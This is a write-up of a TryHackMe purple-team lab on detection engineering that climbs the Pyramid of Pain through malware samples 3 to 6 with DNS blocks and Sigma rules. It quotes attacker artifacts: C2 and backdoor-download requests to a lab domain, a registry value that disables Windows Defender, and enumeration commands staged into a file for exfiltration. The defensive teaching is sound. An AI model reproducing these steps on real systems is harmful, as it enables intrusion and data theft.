# Purple-Team Detection Engineering — Climbing the Pyramid of Pain

A hands-on threat-simulation and detection-engineering case study. Working as the
defender in an iterative purple-team engagement, I built detections against an
attacker ("Sphinx") who escalated his malware samples each round to evade my
previous detection. Each round forced me one level higher up the
**[Pyramid of Pain](https://www.attack.mitre.org/)** — from trivial-to-change
indicators (file hashes) up to the hardest thing for an attacker to change
(their techniques and procedures).

> **Note:** This write-up is based on a TryHackMe lab. It documents my analysis,
> reasoning, and detection decisions — not a step-by-step answer key. No flags are
> included. The goal is to demonstrate the *thinking* behind layered detection.

---

## What is the Pyramid of Pain?

The Pyramid of Pain ranks indicators of compromise by **how much pain it causes
the attacker when you detect and block that indicator**. The higher up you detect,
the more expensive it is for the attacker to adapt — and the more likely they give
up and move to an easier target.

```
              /\
             /  \        TTPs                ← hardest to change (most pain)
            /----\
           / Tools \
          /--------\
         / Network  \     Host Artifacts
        /   & Host   \    Network Artifacts
       /--------------\
      /    Domain      \
     /------------------\
    /   IP Addresses     \
   /----------------------\
  /      Hash Values       \                 ← easiest to change (least pain)
 /--------------------------\
```

The engagement below walks that pyramid from the bottom up. This repo documents
**samples 3 through 6**, where the detection work moves from network indicators
into behavioral and TTP-level detection.

---

## Engagement Summary

| Round | Sample | Attacker Evasion | Indicator I Detected | Pyramid Level | Tool Used |
|-------|--------|------------------|----------------------|---------------|-----------|
| 3 | `sample3.exe` | Moved C2 to a **domain** | Malicious domain `emudyn.bresonicz.info` | Domain Names | DNS Filter |
| 4 | `sample4.exe` | Defeated hash/IP/domain | Registry write disabling Windows Defender | Host Artifacts | Sigma (Sysmon Registry) |
| 5 | `sample5.exe` | Backend-driven, changeable protocols/artifacts | **Beaconing pattern** (fixed size + interval) | Network Artifacts / Behavior | Sigma (Sysmon Network) |
| 6 | `sample6.exe` | New tooling, "can't continue after this" | **Command procedure** staging data for exfil | TTPs | Sigma (Sysmon Process Creation) |

The prior rounds (samples 1–2, not documented here) covered the bottom two levels:
blocking a known-bad **file hash** (defeated by a simple recompile) and blocking a
**C2 IP** via firewall (defeated by rotating to a new IP). Those failures are what
pushed the engagement up into the rounds below.

---

## Round 3 — Domain-Based C2 (Domain Names)

**Attacker's move:** After I blocked his raw C2 IP with a firewall rule, Sphinx
moved his command-and-control to a **domain name**, so a static IP block no longer
worked.

**Analysis (Malware Sandbox — `sample3.exe`):**
- Tagged `Trojan.Metasploit.A`; same behavioral profile as earlier samples
  (reads machine GUID, checks LSA protection).
- **Network activity revealed a domain this time:** the malware resolved and
  beaconed to `emudyn.bresonicz.info` → `62.123.140.9`
  (ASN: *Xplorlta Cloud Services* — a generic host, consistent with attacker C2).
- The same domain served a **dual role**:
  - **C2 beaconing:** `GET http://emudyn.bresonicz.info:1337/kzn293la`
  - **Payload staging:** `GET http://emudyn.bresonicz.info/backdoor.exe`
    (downloaded and executed as a second-stage process, `backdoor.exe`).
- I distinguished the malicious domain from **benign** `services.microsoft.com`
  (ASN: Microsoft) by checking the **ASN** column — a repeatable way to separate
  legitimate infrastructure from rented attacker infrastructure.

**Detection decision:** Block the **domain**, not the IP. Blocking the domain
catches the C2 regardless of what IP it resolves to (the attacker can repoint DNS
in seconds, but re-registering domains costs more). A single domain block also
kills **both** the beacon channel **and** the `backdoor.exe` delivery.

**Rule created (DNS Filter):**
- Name: `Block-C2-emudyn.bresonicz.info`
- Category: Malware
- Domain: `emudyn.bresonicz.info`
- Action: Deny

*Screenshots: [`sample3.png`](screenshots/sample3.png),
[`sample3_B.png`](screenshots/sample3_B.png),
[`block_sample3.png`](screenshots/block_sample3.png)*

---

## Round 4 — Disabling Windows Defender (Host Artifacts)

**Attacker's move:** Sphinx confirmed hash, IP, and domain blocking would no longer
help, and directed me to focus on **the artifacts and changes his malware leaves on
the victim host**.

**Analysis (Malware Sandbox — `sample4.exe`):**
- Top malicious finding: **"Disables Windows Defender Real-time monitoring."**
- The **Registry Activity** section showed three write/modify events. Two were
  benign OS activity (`explorer.exe` and `notepad.exe` writing normal UI settings).
  One was malicious:

  | Process | Key | Name | Value |
  |---------|-----|------|-------|
  | `sample4.exe` | `HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection` | `DisableRealtimeMonitoring` | `1` |

- Setting `DisableRealtimeMonitoring = 1` turns off Defender's real-time
  protection — a classic **defense-evasion** host artifact.

**Detection decision:** Write a Sigma rule on **Sysmon registry modification**
events, keyed on that exact Defender key/value. Behavior like disabling AV is far
more evasion-resistant than a hash or IP — it's part of *how* the malware operates.

**Rule created (Sigma — Registry Modifications):**
- Registry Key: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection`
- Registry Name: `DisableRealtimeMonitoring`
- Value: `1`
- ATT&CK: **Defense Evasion (TA0005)**

Validated Sigma output (abridged):

```yaml
title: Modification of Windows Defender Real-Time Protection
description: Detects modifications or creations of the Windows Defender
  Real-Time Protection DisableRealtimeMonitoring registry value.
tags:
  - attack.ta0005
  - sysmon
detection:
  selection:
    EventID: 4663
    ObjectType: Key
    ObjectName: 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection'
    NewValue: 'DisableRealtimeMonitoring=1'
  condition: selection
falsepositives:
  - Legitimate changes to Windows Defender settings.
level: high
```

*Screenshots: [`sample4.png`](screenshots/sample4.png),
[`sample4_B.png`](screenshots/sample4_B.png),
[`block_sample4.png`](screenshots/block_sample4.png),
[`sigma_rule_validation_block_sample4.png`](screenshots/sigma_rule_validation_block_sample4.png)*

---

## Round 5 — Beacon Detection (Network Artifacts / Behavior)

**Attacker's move:** Sphinx moved the "heavy lifting" to his back-end server so he
could freely change protocols and host artifacts, defeating every static indicator.
He challenged me to find something **unique or abnormal about the behaviour** of the
tool, and provided 12 hours of outgoing connection logs "to correlate something."

**Analysis (connection log correlation):**
- Among the noise, one destination stood out with a perfectly **regular pattern**:

  ```
  09:00:00 → 51.102.10.19 : 443 : 97 bytes
  09:30:00 → 51.102.10.19 : 443 : 97 bytes
  10:00:00 → 51.102.10.19 : 443 : 97 bytes
  10:30:00 → 51.102.10.19 : 443 : 97 bytes
  ... (every 30 minutes, identical size)
  ```

- **Beaconing:** identical **97-byte** connections to the same C2 every **30
  minutes (1800s)** — machine-like regularity no human would produce. Corroborated
  by the sandbox's "high number of consecutive connections" flag and endless
  `beacon.bat` POSTs to `/keep-alive?hostname=WK102`.
- **Ruled out a decoy:** the log also contained large, variable-sized connections
  (21 KB, 45 KB, 95 KB) to *different, one-off* IPs. These looked like normal
  browsing noise / a false exfiltration lead — not the consistent signal. The
  defining abnormality was the **regular beacon**, not the big transfers.

**Detection decision:** Detect the **beaconing behavior itself**, independent of any
single address. During validation the rule builder rejected a hard-coded IP and then
port ("the attacker has evolved!"), reinforcing the lesson: a durable behavioral
detection must not depend on disposable indicators. I generalized IP and port to
`Any`, leaving the **behavioral signature** — fixed size + fixed interval.

**Rule created (Sigma — Network Connections):**
- Remote IP: `Any` *(generalized — attacker rotates IPs)*
- Remote Port: `Any` *(generalized — attacker rotates ports)*
- Size: `97` bytes
- Frequency: `1800s` (30-minute beacon interval)
- ATT&CK: **Command and Control (TA0011)**

*Screenshots: [`sample5.png`](screenshots/sample5.png),
[`sample5_b.png`](screenshots/sample5_b.png),
[`connection_logs_sample5.png`](screenshots/connection_logs_sample5.png),
[`block_sample5.png`](screenshots/block_sample5.png),
[`sigma_rule_validation_block_sample5.png`](screenshots/sigma_rule_validation_block_sample5.png)*

---

## Round 6 — Detecting the Attacker's Procedure (TTPs)

**Attacker's move:** The top of the pyramid. Sphinx conceded that a new tool would be
a "significant investment" and retraining, and said the key line of the whole
engagement:

> *"The reward no longer outweighs the cost, and I would instead find an easier
> target with detection capabilities much lower on the pyramid."*

He told me to focus on something **"extremely hard for me to change subconsciously —
my techniques and procedures,"** and attached the command logs of the actions he
runs after gaining remote access.

**Analysis (`sample6.exe` process tree + command log):**
- **Process tree showed an abnormal parent-child chain:**

  ```
  explorer.exe
     └─ sample6.exe            (running from C:\Users\admin\AppData\Local\Temp\)
           ├─ cmd.exe
           ├─ cmd.exe
           └─ cmd.exe          → drops %temp%\exfiltr8.log
  ```

  A GUI executable spawning multiple `cmd.exe` shells is itself suspicious, and one
  child dropped a staging file named **`exfiltr8.log`** ("exfiltrate").

- **The command log revealed his procedure** — a fixed sequence of host-enumeration
  commands, each appending its output to the same staging file:

  ```
  dir c:\                         >> %temp%\exfiltr8.log
  dir "c:\Documents and Settings" >> %temp%\exfiltr8.log
  dir "c:\Program Files\"         >> %temp%\exfiltr8.log
  dir d:\                         >> %temp%\exfiltr8.log
  net localgroup administrator    >> %temp%\exfiltr8.log
  ver                             >> %temp%\exfiltr8.log
  systeminfo                      >> %temp%\exfiltr8.log
  ipconfig /all                   >> %temp%\exfiltr8.log
  netstat -ano                    >> %temp%\exfiltr8.log
  net start                       >> %temp%\exfiltr8.log
  ```

**Detection decision:** The **common denominator** across every command is that they
all write to `exfiltr8.log`. Any single command (`dir`, `systeminfo`) is normal on
its own, but redirecting a whole enumeration batch into one staging file is the
malicious fingerprint. Keying on that one string catches the **entire procedure**
regardless of which individual command runs — a true TTP-level detection.

**Rule created (Sigma — Process Creation):**
- Process Name: `cmd.exe`
- CommandLine: Contains
- String: `exfiltr8.log` *(the common thread across the whole procedure)*
- ATT&CK: **Discovery (TA0007)** *(host enumeration staged for exfiltration)*

*Screenshots: [`sample6.png`](screenshots/sample6.png),
[`sample6_b.png`](screenshots/sample6_b.png),
[`command_log_sample6.png`](screenshots/command_log_sample6.png)*

---

## Key Takeaways

- **Match the indicator to what the sample exposes.** Not every round means "always
  go higher" — you detect on the most durable indicator the malware actually reveals
  (a raw-IP sample gets an IP block; a domain-based sample gets a DNS block).
- **The higher up the pyramid, the more durable the detection.** A hash dies to a
  one-byte recompile; a behavioral beacon or a command procedure survives changes to
  hash, IP, domain, protocol, and host artifacts.
- **ASN is a fast triage signal.** Comparing ASNs (Microsoft vs. a generic cloud
  host) reliably separated legitimate traffic from attacker C2.
- **Generalize disposable fields.** Hard-coding an IP or port into a behavioral rule
  reintroduces the same weakness as a hash. The signal was the *pattern* (size +
  interval), not the address.
- **Defense changes the attacker's economics.** By making detection expensive enough,
  the rational attacker choice becomes giving up — which is exactly what happened.

## Tools & Concepts Used

`Malware Sandbox analysis` · `Hash blocklisting` · `Firewall rules (ingress/egress)`
· `DNS filtering` · `Sigma rules` · `Sysmon (Process Creation, Registry, Network
Connections)` · `MITRE ATT&CK mapping` · `Log correlation` · `Beacon analysis` ·
`Pyramid of Pain`

---

*Based on a TryHackMe purple-team lab. Documented for learning purposes — analysis
and reasoning only, no flags or solution keys.*
